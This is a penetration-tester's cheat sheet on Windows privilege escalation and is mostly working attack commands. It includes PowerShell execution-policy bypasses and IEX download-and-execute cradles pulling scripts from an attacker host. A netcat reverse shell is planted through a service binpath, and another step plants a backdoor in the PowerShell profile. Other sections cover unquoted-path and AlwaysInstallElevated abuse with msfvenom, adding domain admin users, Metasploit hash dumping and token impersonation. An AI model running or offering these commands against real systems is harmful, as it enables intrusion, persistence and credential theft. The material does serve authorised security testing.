# Privilege Escalation

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## PowerShell Script Execution Policy Bypass Methods

<table>
  <thead>
    <tr>
      <th style="text-align:left">Bypass Method</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left"><code>Set-Executionpolicy unrestricted</code>
      </td>
      <td style="text-align:left">Administrator rights are required.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>Set-ExecutionPolicy -Scope CurrentUser Unrestricted</code>
      </td>
      <td style="text-align:left">Only works in the context of the current user, but requires no Administrator
        rights.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <ol>
          <li>Open .ps1 file in text editor.</li>
          <li>Copy all text in the file</li>
          <li>Paste into PowerShell</li>
        </ol>
      </td>
      <td style="text-align:left">PowerShell will run each line of the script one at a time, essentially
        the same as running the script.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>function &lt;name&gt; { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">Similar to the above example, however you paste your code inside the curly
        braces, and run the code by typing the <code>&lt;name&gt;</code> of your
        function. Allows for <b>code reuse without having to copy and paste multiple times.</b>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"><code>cat $script | IEX</code>
      </td>
      <td style="text-align:left">Pipes the content of the script to the <code>Invoke-Expression</code> cmdlet,
        which runs any specified string as a command and returns the results to
        the console. <code>IEX</code> is an alias for <code>Invoke-Expression</code>.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>IEX { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">Essentially creates a one-time use function from your code.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>&amp; { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">The operator (<code>&amp;</code>) is an alias for <code>Invoke-Expression</code> and
        is equivalent to the example above.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>. { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">The operator (<code>.</code>) can be used to create an anonymous one-time
        function. This can sometimes be used to bypass certain constrained language
        modes.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p><code>$text = Get-Content $text_file -Raw</code>
        </p>
        <p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code>
        </p>
        <p>&lt;code&gt;&lt;/code&gt;</p>
        <p><code>&amp; $script</code>
        </p>
      </td>
      <td style="text-align:left">Using the .NET object <code>System.Management.Automation.ScriptBlock</code> we
        can compile and text content to a script block. Then, using (<code>&amp;</code>)
        we can easily execute this compiled and formatted text file.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) | PowerShell -NoProfile -</code>
      </td>
      <td style="text-align:left">Download script from attacker&apos;s machine, then run in PowerShell,
        in memory. No files are written to disk.</td>
    </tr>
  </tbody>
</table>

### Other Bypass Methods

#### Execute .ps1 scripts on compromised machine: in memory and other bypass methods

If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.

```text
IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ip/$script.ps1")
```

`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.

```text
Invoke-Command -ComputerName $computer -FilePath .'\$module.ps1m' -Credential (Get-Credential)
```

This will execute the file and it's contents on the remote computer.

Another sneaky method would be to have the script load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.

```text
Write-Verbose "Creates powershell profile for user"
New-Item -Path $PROFILE -ItemType File -Force
#
# The $PROFILE VARIABLE IS EITHER GOING TO BE
#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
# OR
#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
#
# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
cmd /c 'copy \\$attacker_ip>\$script.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1

powershell.exe
# If that does not work try reloading the user profile.
& $PROFILE
```

### Run script code as a function

Running the code from your PowerShell script inside a function will completely bypass script execution policies.  Other code protection policies such as JEA may still stop certain cmdlets and code from running, however.

```text
function $function_name {

#code goes here

}
```

Then you can re-use the code by just typing the function name.

## Powershell Sudo for Windows

\#TODO:make it so this will take arguments, so can use like `sudo -User bob test.bat`

There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`.  It is not as simple to use as `sudo`, however.  Below is a PowerShell script that that will run a separate file as another user. You can then run a batch file, PowerShell script, or just execute a meterpreter binary as that user. The below function is to be run from a PowerShell prompt:

```text
function sudo {

#hard-coded $Password that can be sniffed, beware
$pw = ConvertTo-SecureString "$Password" -AsPlainText -Force

$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$DomainName\$UserName",$pw

#The $script below can be any privilege escalation or reverse shell script or executable
#TODO:make it so this will take an argument, so can use like "sudo -User bob test.bat"
$script = "C:\Users\$UserName\AppData\Local\Temp\test.bat"

Start-Process powershell -Credential $cred -ArgumentList '-NoProfile -Command &{Start-Process $script -verb RunAs}'
}

sudo
```

Running this in a function will bypass Script Execution policies, though JEA may still give you trouble.

## Services

### Modify service binary path \(_link to persistence pages_\)

If one of the groups you have access to has SERVICE\_ALL\_ACCESS in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:

```text
sc config <service_Name> binpath= "C:\nc.exe -nv <IP> <port> -e C:\WINDOWS\System32\cmd.exe"
//use SYSTEM privileged service to add your user to administrators group
sc config <service_Name> binpath= "net localgroup administrators <username> /add"
//replace executable with your own binary (best to only do this for unused services!)
sc config <service_name> binpath= "C:\path\to\backdoor.exe"
```

### Service Permissions \(TODO:_link to persistence pages_\)

Other Permissions can be used to escalate privileges: 

* `SERVICE_CHANGE_CONFIG`: Can reconfigure the service binary 
* `WRITE_DAC`: Can reconfigure permissions, leading to `SERVICE_CHANGE_CONFIG`
* `WRITE_OWNER`: Can become owner, reconfigure permissions 
* `GENERIC_WRITE`: Inherits `SERVICE_CHANGE_CONFIG`
* `GENERIC_ALL`: Inherits `SERVICE_CHANGE_CONFIG`\(To detect and exploit this vulnerability you can use `exploit/windows/local/service_permissions` in MetaSploit\)

Check if you can modify the binary that is executed by a service. You can retrieve a list of every binary that is executed by a service using `wmic` \(not in system32\) and check your permissions using `icacls`:

```text
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use `sc.exe` and `icacls`:

```text
sc.exe query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Services registry permissions \(TODO: _link to persistence pages_\)

You should check if you can modify any service registry. You can check your permissions over a service registry doing:

```text
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have `FullControl`. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`

### Unquoted Service Paths \(TODO: _link to persistence pages_\)

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:

```text
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

To list all unquoted service paths \(minus built-in Windows services\)

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
```

-or-

```text
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
    for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
        echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
    )
)
```

-also-

```text
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

You can detect and exploit this vulnerability with metasploit using the module: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators $username /add" -f exe-service -o service.exe`

## Misc

TODO: Categorize each of these, prep for scripting, add descriptions

### Download files with PowerShell

#### Using System.Net.WebClient

```text
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.26/shell.ps1', 'shell.ps1')
```

#### Using Invoke-WebRequest

```text
Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1'-OutFile 'shell.ps1'
```

#### Download and Execute

```text
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
```

#### **Using Bitsadmin**

```text
bitsadmin /transfer mydownloadjob /download /priority normal http:///$ip/$file C:\\Users\\%USERNAME%\\AppData\\local\\temp\\$file
```

**Using Certutil**

```text
certutil.exe -urlcache -split -f "http://$ip/$file" $file
```

### **AlwaysInstall Elevated**

Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### msfvenom

```text
msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi
```

#### msiexec \(on victim machine\)

```text
msiexec /quiet /qn /i C:\create_user.msi
```

#### Metasploit module

```text
use exploit/windows/local/always_install_elevated
```

### **Add User**

```text
net user hacker hack3dpasswd /add
```

### **Make User Admin**

```text
net localgroup administrators hacker /add
```

### Get all members of "Domain Admins" group

```text
net group "Domain Admins" /domain
```

### Dump password hashes \(Metasploit\)

```text
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
```

### Find admin users \(Metasploit\)

```text
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run
msf> spool off
```

### Impersonate an administrator \(meterpreter\)

```text
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > getuid
meterpreter > shell
```

### Add a user

```text
C:\> net user hacker /add /domain
C:\> net group "Domain Admins" hacker /add /domain
```

### Covert to and from Base64 with PowerShell

#### Convert to base64

```text
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('whoami'))
# d2hvYW1p
```

#### Convert from base64

```text
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))
 # whoami
```

#### Execute a base64 payload in powershell

```text
powershell.exe -command "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))"
# hostname\username
```

### Using `Runas` to execute commands as another user

```text
C:\Windows\System32\runas.exe /env /noprofile /user:$UserName $Password "$Commands"
```

#### Using PowerShell

```text
$passwd = ConvertTo-SecureString "$Password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("$UserName", $passwd)
$computer = "$ComputerName"
[System.Diagnostics.Process]::Start("$Commands", $creds.Username, $creds.Password, $computer)
```

#### Using PsExec

```text
PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
```

## References

* [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
* [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)



If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!

